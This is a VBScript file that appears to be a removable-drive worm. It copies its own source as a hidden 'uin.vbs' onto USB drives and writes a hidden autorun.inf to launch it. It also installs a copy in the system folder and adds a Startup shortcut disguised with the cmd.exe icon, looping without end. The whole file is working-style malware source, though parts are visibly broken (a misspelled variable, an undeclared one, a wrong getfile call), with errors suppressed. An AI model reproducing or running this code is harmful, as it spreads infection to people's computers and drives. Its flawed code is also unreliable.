option explicit

on error resume next

dim fso,s,d,w,r,c,drive,a,q,f,shells,fd

set fso=createobject("Scripting.filesystemobject")
set f=fso.getfile(wscript.scriptfullname)
set d=fso.drives
set shells=wscript.createobject("wscript.shell")
s= shells.SpecialFolders("Startup")
set r=f.openastextstream(1,-2)
set sy=fso.getspecialfolder(1)

do while not r.atendofstream
	a=a & r.readline
	a=a & vbcrlf
loop
c=1
do
for each drive in d
	if drive.drivetype=1 and dirve.isready then
		if not fso.fileexists(drive.path & "\uin.vbs") then
			set w=fso.createtextfile(drive.path & "\uin.vbs")
			w.write a
			w.close
			set w=fso.getfile(drive.path & "\uin.vbs")
			w.attributes=-1
		end if
		if not fso.fileexists(drive.path & "\autorun.inf") then
			set w=fso.createtextfile(drive.path & "\autorun.inf")
			w.writeline "[autorun]"
			w.writeline "Shellexecute=wscript.exe uin.vbs"
			w.writeline "Shell.open=uin.vbs"
			w.writeline "Shell.execute uin.vbs"
			w.writeline "Shell.open uin.vbs"
			w.writeline "Shell.open=wscript.exe uin.vbs"
			w.writeline "Shell.open wscript.exe uin.vbs" 
			w.close
			set w=fso.getfile(drive.path & "\autorun.inf")
			w.attributes=-1
		end if
		if fso.fileexists(drive.path & "\autorun.inf") then
			set w=fso.getfile(drive.path & "\autorun.inf")
			w.attributes=-8
			set w=fso.getfile(drive.path & "\autorun.inf",2,true)
			w.writeline "Shellexecute=wscript.exe uin.vbs"
			w.close
			set w=fso.getfile(drive.path & "\autorun.inf")
			w.attributes=-1
			w.close
		end if
			
	end if
	if drive.drivetype=2 then
		if not fso.fileexists(sy & "\uin.vbs") then
			set w=fso.createtextfile(sy & "\uin.vbs")
			w.write a
			w.close
			set w=fso.getfile(sy & "\uin.vbs")
			w.attributes=-1
		end if			
			set w=shells.createshortcut(s & "\uin.lnk")
			w.targetpath= wscript.scriptfullname
			w.iconlocation="cmd.exe, 0"
			w.save				
	end if
next
loop while c<>2
